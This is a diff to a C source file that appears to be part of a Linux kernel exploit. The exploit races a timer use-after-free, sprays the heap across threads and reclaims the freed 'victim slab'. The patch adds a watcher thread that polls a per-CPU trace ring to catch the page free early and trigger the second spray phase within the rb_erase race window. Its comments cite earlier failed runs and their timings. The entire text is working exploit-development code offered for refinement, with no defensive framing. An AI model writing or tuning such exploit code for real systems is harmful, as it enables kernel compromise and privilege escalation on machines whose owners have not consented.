@@ -1,0 +1,127 @@
+diff --git a/src/timer/timer.c b/src/timer/timer.c
+--- a/src/timer/timer.c
++++ b/src/timer/timer.c
+@@ -2138,6 +2138,9 @@
+ static int g_pool_n;
+ static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
+ static _Atomic int g_spray_tids[SPRAY_THREADS];
++/* v4: pre-zombie free watcher (see free_watch_thread below). */
++static _Atomic int g_pre_free, g_watch_live;
++static unsigned long long g_watch_pfn;
+ 
+ struct spray_arg
+ {
+@@ -2247,13 +2250,53 @@
+     return NULL;
+ }
+ 
++/*
++ * v4: the victim page free happens during exec, before the zombie appears.
++ * The v3 post-zombie loop only catches the ring event if it survived the
++ * exec-to-zombie window; under ring traffic the event is overwritten and
++ * the release falls to the 150 ms fallback -- far past the one-shot
++ * rb_erase window (~10-60 ms; PD2405 run 6 phase 2: fallback release at
++ * 229 ms, burst hit=0).  This watcher drains the exec cpu ring from a
++ * foreign cpu while the parent blocks in wait_zombie(), so the free is
++ * seen within a few ms of the fire and phase 2 releases immediately.
++ * The race window on the trigger cpu stays untouched.
++ */
++static void *free_watch_thread(void *x)
++{
++    unsigned char *buf;
++    long t0 = now_ms();
++
++    (void)x;
++    buf = malloc(1u << 20);
++    if (!buf)
++        return NULL;
++    pin(g_cpu == 0 ? 1 : 0);
++    prctl(PR_SET_NAME, "yfreewatch", 0, 0, 0);
++    while (!atomic_load(&g_pre_free) && !atomic_load(&g_stop_spray))
++    {
++        long m = read_fd(g_rawfd[g_cpu], buf, 1u << 20);
++
++        if (m > 0 && scan_page_free(buf, (size_t)m, g_watch_pfn))
++        {
++            atomic_store(&g_burst2, 1);
++            atomic_store(&g_pre_free, 1);
++            logf("[+] plant free watch: victim slab freed; "
++                 "phase2 released at %ldms\n", now_ms() - t0);
++            break;
++        }
++        usleep(100);
++    }
++    free(buf);
++    return NULL;
++}
++
+ static void run_plant(unsigned long long target, int tag, int mode,
+                       struct plant_res *res, unsigned char *raw)
+ {
+     unsigned long long ptrs[NTIMERS];
+     unsigned long long pfn = 0, slab_pfn = 0;
+     unsigned char *payload = NULL;
+-    pthread_t th[SPRAY_THREADS];
++    pthread_t th[SPRAY_THREADS], wth;
+     struct spray_arg args[SPRAY_THREADS];
+     int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
+     memset(res, 0, sizeof(*res));
+@@ -2478,7 +2521,22 @@
+     /*
+      * Release the race without spray CPU contention; V is already captured,
+      * so the burst can start immediately after the zombie appears.
++     *
++     * v4: drain the exec cpu ring first so the free watcher below only sees
++     * events newer than the fire -- a stale free of a previous plant's
++     * victim slab with the same pfn must not trigger an early release.  The
++     * flush runs while the exec thread is still parked on the timer_go
++     * handshake, so the race window is undisturbed.  The watcher (foreign
++     * cpu) then polls the exec cpu ring while the parent blocks in
++     * wait_zombie(); the victim page free during exec is read within a few
++     * ms and phase 2 releases immediately instead of falling to the 150 ms
++     * fallback after the zombie.
+      */
++    (void)read_fd(g_rawfd[g_cpu], raw, 32u << 20);
++    atomic_store(&g_pre_free, 0);
++    g_watch_pfn = slab_pfn;
++    if (pthread_create(&wth, NULL, free_watch_thread, NULL) == 0)
++        atomic_store(&g_watch_live, 1);
+     if (g_timer_go_w >= 0)
+     {
+         if (write(g_timer_go_w, "x", 1) != 1)
+@@ -2492,6 +2550,8 @@
+     {
+         atomic_store(&g_stop_spray, 1);
+         atomic_store(&g_burst2, 1);
++        if (atomic_load(&g_watch_live))
++            pthread_join(wth, NULL);
+         for (int i = 0; i < SPRAY_THREADS; i++)
+             pthread_join(th[i], NULL);
+         trace_stop();
+@@ -2505,6 +2565,8 @@
+     {
+         atomic_store(&g_stop_spray, 1);
+         atomic_store(&g_burst2, 1);
++        if (atomic_load(&g_watch_live))
++            pthread_join(wth, NULL);
+         for (int i = 0; i < SPRAY_THREADS; i++)
+             pthread_join(th[i], NULL);
+         trace_stop();
+@@ -2525,6 +2587,8 @@
+         return;
+     }
+     atomic_store(&g_burst, 1);
++    if (atomic_load(&g_pre_free))
++        free_seen = 1; /* v4 watcher already released phase 2 pre-zombie */
+     /*
+      * Phase 1 is already spraying.  When the victim page is freed, release
+      * phase 2 immediately; detecting the free before the allocation would
+@@ -2574,6 +2638,8 @@
+     }
+     atomic_store(&g_stop_spray, 1);
+     atomic_store(&g_burst2, 1);
++    if (atomic_load(&g_watch_live))
++        pthread_join(wth, NULL);
+     for (int i = 0; i < SPRAY_THREADS; i++)
+         pthread_join(th[i], NULL);
+     trace_stop();
